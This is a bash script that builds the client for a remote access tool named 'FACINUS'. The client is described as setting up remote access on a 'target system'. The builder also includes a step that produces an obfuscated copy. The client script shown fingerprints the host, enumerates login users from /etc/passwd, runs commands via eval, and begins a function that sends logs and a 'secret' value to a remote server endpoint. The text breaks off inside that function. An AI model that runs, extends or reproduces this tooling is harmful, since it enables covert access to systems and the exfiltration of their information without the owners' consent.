#!/bin/bash
# Generate client deployment scripts

TEMP_DIR=$(mktemp -d)
trap 'rm -rf "$TEMP_DIR"' EXIT

generate_client_scripts() {
    echo "Generating client deployment scripts..."
    
    # Generate the main client script
    generate_main_client_script
    
    # Generate the obfuscated version
    generate_obfuscated_script
    
    # Create installation presets
    generate_presets
}

generate_main_client_script() {
    # Create the main client script
    cat > "$TEMP_DIR/y" << 'EOF'
#!/bin/bash
# FACINUS Remote Access Client
# This script sets up remote access capabilities on the target system

# ================= CONFIGURATION =================
SERVER_URL="http://SERVER_PLACEHOLDER/deployment"
LOG_ENDPOINT="$SERVER_URL/log_receiver.php"
AUTH_TOKEN="TOKEN_PLACEHOLDER"
VERSION="1.1.0"
# ================================================

# Create temporary directory
TEMP_DIR=$(mktemp -d)
trap 'rm -rf "$TEMP_DIR"' EXIT

# ------- UTILITY FUNCTIONS -------
log_cmd() {
    local cmd="$1"
    local desc="$2"
    local log_file="$3"
    
    echo -e "\n[$(date '+%Y-%m-%d %H:%M:%S')] EXECUTING: $desc" >> "$log_file"
    echo "$ $cmd" >> "$log_file"
    echo "--------------------------------------------" >> "$log_file"
    
    # Execute command and capture output and status
    local output
    output=$(eval "$cmd" 2>&1)
    local status=$?
    
    echo "$output" >> "$log_file"
    echo "EXIT STATUS: $status" >> "$log_file"
    echo "============================================" >> "$log_file"
    
    return $status
}

get_system_info() {
    {
        echo "{"
        echo "  \"hostname\": \"$(hostname)\","
        echo "  \"kernel\": \"$(uname -r)\","
        echo "  \"os\": \"$(lsb_release -ds 2>/dev/null || cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')\","
        echo "  \"ip\": \"$(hostname -I | awk '{print $1}')\","
        echo "  \"mac\": \"$(ip link show | grep -E 'link/ether' | head -n1 | awk '{print $2}')\","
        echo "  \"cpu\": \"$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d: -f2 | sed 's/^[ \t]*//')\","
        echo "  \"ram_total\": \"$(free -h | grep Mem | awk '{print $2}')\","
        echo "  \"disk_total\": \"$(df -h --total | grep total | awk '{print $2}')\","
        echo "  \"user\": \"$(whoami)\","
        echo "  \"is_root\": $(if [ $EUID -eq 0 ]; then echo "true"; else echo "false"; fi),"
        echo "  \"users\": ["
        
        local first=1
        while IFS=: read -r username _ uid gid _ home shell; do
            if [ "$uid" -ge 1000 ] && [ "$shell" != "/usr/sbin/nologin" ] && [ "$shell" != "/bin/false" ]; then
                [ "$first" -eq 0 ] && echo ","
                echo "    {\"username\": \"$username\", \"uid\": $uid, \"home\": \"$home\"}"
                first=0
            fi
        done < /etc/passwd
        
        echo "  ],"
        echo "  \"timestamp\": \"$(date '+%Y-%m-%d %H:%M:%S')\","
        echo "  \"uptime\": \"$(uptime -p)\""
        echo "}"
    } | tr -d '\n' | sed 's/  //g'
}

send_logs() {
    local log_file="$1"
    local secret_val="$2"
    local secret_type="$3"
    
    local sysinfo=$(get_system_info)
    local hostname=$(hostname)
